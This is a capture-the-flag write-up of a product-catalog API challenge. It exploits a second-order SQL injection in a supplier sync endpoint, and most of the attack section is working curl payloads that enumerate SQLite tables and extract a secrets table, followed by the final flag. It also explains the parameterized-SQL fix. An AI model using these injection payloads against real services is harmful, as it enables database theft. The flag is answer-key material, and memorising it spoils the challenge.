# Supply Chain Reaction

## Metadata

| Field | Value |
| --- | --- |
| Category | `api` |
| Difficulty | Medium |
| Points | 275 |
| Solves | 45 |
| First Blood | S3r4ph1el |

## Challenge Description

```text
A product catalog API pulls in data from its trusted supplier partners. Trusted.
Partners.

Not every endpoint made it into the docs.
```

## Artifacts

This challenge was solved from the live API. At the time of this write-up pass,
there was no source archive in this directory, so the useful artifacts were the
live HTTP responses and the final helper script:

```text
solve_supply_chain.sh
```

Target used during the solve:

```text
https://94284f6f0a0f6fc2.chal.ctf.ae
```

## Recon

I started with the root endpoint to avoid guessing hidden paths:

```bash
curl -k -i https://94284f6f0a0f6fc2.chal.ctf.ae/
```

Response:

```json
{
  "documentation": "/api/docs",
  "service": "ProductCatalog API",
  "status": "operational",
  "version": "2.4.1"
}
```

The documentation listed the public API:

```bash
curl -k -i https://94284f6f0a0f6fc2.chal.ctf.ae/api/docs
```

Relevant response:

```json
{
  "api": "ProductCatalog",
  "endpoints": [
    {"method": "GET", "path": "/api/products"},
    {"method": "GET", "path": "/api/products/<id>"},
    {"method": "POST", "path": "/api/products/sync"}
  ],
  "note": "Not all endpoints are documented here."
}
```

That note made me look at headers and secondary metadata, not just JSON bodies.
Requesting the product list exposed an undocumented supplier registration route
through the `Link` header:

```bash
curl -k -i https://94284f6f0a0f6fc2.chal.ctf.ae/api/products
```

Relevant header:

```http
Link: </api/supplier/register>; rel="supplier-registration", </api/docs>; rel="documentation"
```

The current product list was normal catalog data:

```json
{
  "count": 5,
  "products": [
    {"id": 1, "name": "Industrial Sensor Module A1", "supplier": "internal"}
  ]
}
```

So the first real lead was not SQL injection yet. It was the hidden supplier
workflow mentioned by the challenge text and leaked by the API's `Link` header.

## Supplier Flow

The hidden registration endpoint explained the next step:

```bash
curl -k -i https://94284f6f0a0f6fc2.chal.ctf.ae/api/supplier/register
```

Relevant response:

```json
{
  "description": "Register as a new supplier to submit products",
  "method": "POST",
  "next_step": "After registration, use your supplier_id to submit products via /api/supplier/products"
}
```

I registered a supplier:

```bash
curl -k -X POST https://94284f6f0a0f6fc2.chal.ctf.ae/api/supplier/register \
  -H 'Content-Type: application/json' \
  -d '{"company_name":"codex-writeup","contact_email":"codex-writeup@example.com"}'
```

Response:

```json
{
  "status": "registered",
  "supplier_id": "43edbdd6"
}
```

Then I submitted a normal product using that ID:

```bash
curl -k -X POST https://94284f6f0a0f6fc2.chal.ctf.ae/api/supplier/products \
  -H 'X-Supplier-ID: 43edbdd6' \
  -H 'Content-Type: application/json' \
  -d '{"name":"writeup-normal-product","price":1.23}'
```

The supplier endpoint accepted it as pending:

```json
{
  "status": "submitted",
  "product": {
    "name": "writeup-normal-product",
    "price": 1.23,
    "status": "pending_sync",
    "supplier_id": "43edbdd6"
  }
}
```

After calling the public sync route:

```bash
curl -k -X POST https://94284f6f0a0f6fc2.chal.ctf.ae/api/products/sync
```

the product appeared in the public catalog:

```bash
curl -k 'https://94284f6f0a0f6fc2.chal.ctf.ae/api/products?search=writeup-normal-product'
```

Response:

```json
{
  "count": 1,
  "products": [
    {"name": "writeup-normal-product", "price": 1.23, "supplier": "43edbdd6"}
  ]
}
```

This confirmed the important data path:

```text
supplier submission -> pending supplier feed -> /api/products/sync -> public products table
```

## Vulnerability

The vulnerable behavior is SQL injection in the sync/import path. The supplier
submission endpoint stores product data, but the dangerous behavior only happens
later when `/api/products/sync` imports supplier products into the public
catalog.

The clue was the boundary between "pending supplier input" and "public catalog
row". I tested whether the sync process treated supplier product fields as data
or as SQL syntax by submitting a product name that would close a string and
control the remaining inserted columns:

```bash
curl -k -X POST https://94284f6f0a0f6fc2.chal.ctf.ae/api/supplier/products \
  -H 'X-Supplier-ID: 43edbdd6' \
  -H 'Content-Type: application/json' \
  -d "{\"name\":\"wrinj-ok',123,'supinj')-- \",\"price\":1}"
```

After syncing and searching for `wrinj-ok`, the product appeared as:

```json
{
  "name": "wrinj-ok",
  "price": 123.0,
  "supplier": "supinj"
}
```

That response proved the injection shape. The `name` value closed the original
string, supplied `123` as the inserted price, supplied `supinj` as the inserted
supplier value, and commented out the rest of the SQL statement.

This matches a second-order SQL injection pattern: the first request stores
attacker-controlled supplier data, and a later sync job retrieves that stored
data and uses it unsafely in a SQL query. PortSwigger describes this exact class
as data being safely stored initially, then later incorporated into a SQL query
in an unsafe way.

## Exploitation

The exploit chain was:

1. Query `/` and `/api/docs` to map the public API.
2. Inspect `/api/products` response headers and find the hidden supplier
   registration link.
3. Register as a supplier and obtain a `supplier_id`.
4. Submit a normal product and trigger `/api/products/sync` to understand the
   intended workflow.
5. Submit a product name that breaks out of the sync import query and controls
   the inserted `price` and `supplier` columns.
6. Use the `supplier` column as the exfiltration sink because it is returned by
   `/api/products?search=<marker>`.
7. Enumerate the database type, tables, schema, and finally secret values.

First I confirmed the database engine:

```bash
curl -k -X POST https://94284f6f0a0f6fc2.chal.ctf.ae/api/supplier/products \
  -H 'X-Supplier-ID: 43edbdd6' \
  -H 'Content-Type: application/json' \
  -d "{\"name\":\"wrdbver',0,sqlite_version())-- \",\"price\":1}"
```

After sync, the result was:

```json
{
  "name": "wrdbver",
  "price": 0.0,
  "supplier": "3.46.1"
}
```

Then I listed tables from `sqlite_master`:

```bash
curl -k -X POST https://94284f6f0a0f6fc2.chal.ctf.ae/api/supplier/products \
  -H 'X-Supplier-ID: 43edbdd6' \
  -H 'Content-Type: application/json' \
  -d "{\"name\":\"wrtables',0,(SELECT group_concat(name, ',') FROM sqlite_master WHERE type='table'))-- \",\"price\":1}"
```

After sync:

```json
{
  "name": "wrtables",
  "supplier": "products,sqlite_sequence,secrets"
}
```

The `secrets` table was the obvious next target, but I still confirmed its schema
instead of guessing column names:

```bash
curl -k -X POST https://94284f6f0a0f6fc2.chal.ctf.ae/api/supplier/products \
  -H 'X-Supplier-ID: 43edbdd6' \
  -H 'Content-Type: application/json' \
  -d "{\"name\":\"wrschema',0,(SELECT sql FROM sqlite_master WHERE name='secrets'))-- \",\"price\":1}"
```

After sync:

```text
CREATE TABLE secrets (id INTEGER PRIMARY KEY, key TEXT NOT NULL, value TEXT NOT NULL)
```

Finally, I exfiltrated `key:value` pairs:

```bash
curl -k -X POST https://94284f6f0a0f6fc2.chal.ctf.ae/api/supplier/products \
  -H 'X-Supplier-ID: 43edbdd6' \
  -H 'Content-Type: application/json' \
  -d "{\"name\":\"wrsecret',0,(SELECT group_concat(key || ':' || value, '|') FROM secrets))-- \",\"price\":1}"
```

After sync and search:

```json
{
  "name": "wrsecret",
  "price": 0.0,
  "supplier": "api_flag:flag{f0e22852b887b0cb}"
}
```

## Technical Details

The working payload has the form:

```text
marker',0,(SELECT expression))-- 
```

The observed behavior fits an unsafe `INSERT`-style statement where `name`,
`price`, and `supplier` are inserted as adjacent values. The benign proof:

```text
wrinj-ok',123,'supinj')-- 
```

produced:

```json
{"name":"wrinj-ok","price":123.0,"supplier":"supinj"}
```

That tells us the injected payload is not just causing an error. It is taking
control of the remaining inserted values. The exploit uses this by placing
subqueries in the supplier position:

```sql
(SELECT group_concat(name, ',') FROM sqlite_master WHERE type='table')
```

and:

```sql
(SELECT group_concat(key || ':' || value, '|') FROM secrets)
```

The public product search endpoint becomes the read channel. I used unique
markers such as `wrdbver`, `wrtables`, `wrschema`, and `wrsecret` so each
injected row could be retrieved deterministically from the public catalog.

The fix would be to use parameterized SQL in the sync/import path. It is not
enough to validate only the supplier submission endpoint if the later importer
reuses stored data in string-built SQL.

## Exploit Artifact

The final artifact is [solve_supply_chain.sh](solve_supply_chain.sh). It:

1. registers a fresh supplier;
2. submits one SQLi product payload;
3. triggers `/api/products/sync`;
4. searches for the marker row;
5. prints the flag from the returned JSON.

Usage:

```bash
chmod +x solve_supply_chain.sh
./solve_supply_chain.sh https://94284f6f0a0f6fc2.chal.ctf.ae
```

## Validation

Supplier registration:

```json
{"status":"registered","supplier_id":"43edbdd6"}
```

SQLi control:

```json
{"name":"wrinj-ok","price":123.0,"supplier":"supinj"}
```

Database fingerprint:

```json
{"name":"wrdbver","supplier":"3.46.1"}
```

Table enumeration:

```json
{"name":"wrtables","supplier":"products,sqlite_sequence,secrets"}
```

Secret exfiltration:

```json
{"name":"wrsecret","supplier":"api_flag:flag{f0e22852b887b0cb}"}
```

Final script output:

```text
flag{f0e22852b887b0cb}
```

## References

- <https://portswigger.net/web-security/sql-injection>
- <https://owasp.org/www-community/attacks/SQL_Injection>

## Flag

```text
flag{f0e22852b887b0cb}
```
